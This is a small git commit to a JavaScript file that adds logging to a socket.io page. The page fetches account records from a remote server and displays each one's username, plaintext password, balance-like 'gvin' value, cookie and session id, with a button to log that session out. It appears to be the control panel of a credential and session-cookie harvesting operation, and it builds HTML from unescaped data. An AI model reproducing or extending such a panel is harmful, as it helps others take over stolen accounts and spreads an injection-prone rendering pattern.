69f620b81c0fcfaabbf612601c03792475006dc3
Nhân Nguyễn <nhnhan.18it1@sict.udn.vn>
2021-05-11 11:20:05 +0700

    hello

--- public/main.js
+++ public/main.js
@@ -2,12 +2,14 @@ const socket = io("https://vin88.herokuapp.com");
 socket.emit("mlog")
 socket.emit("getAllAcc")
 socket.on("returnAll",(datas)=>{
+    console.log(datas)
     $("#main").html("");
     datas.forEach(data => {
         jq.$("#main").append('<td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" onclick="logout('+data.sessid+')" class="btn btn-primary">Logout</button></td>');
     });
 })
 socket.on("loginchange",(datas)=>{
+    console.log(datas)
     datas.forEach(data => {
         jq.$("#main").append('<td scope="row">'+data.username+'</td><td>'+data.pass+'</td><td>'+data.gvin+'</td><td>'+data.cookie+'</td><td><button type="button" onclick="logout('+data.sessid+')" class="btn btn-primary">Logout</button></td>');
     });
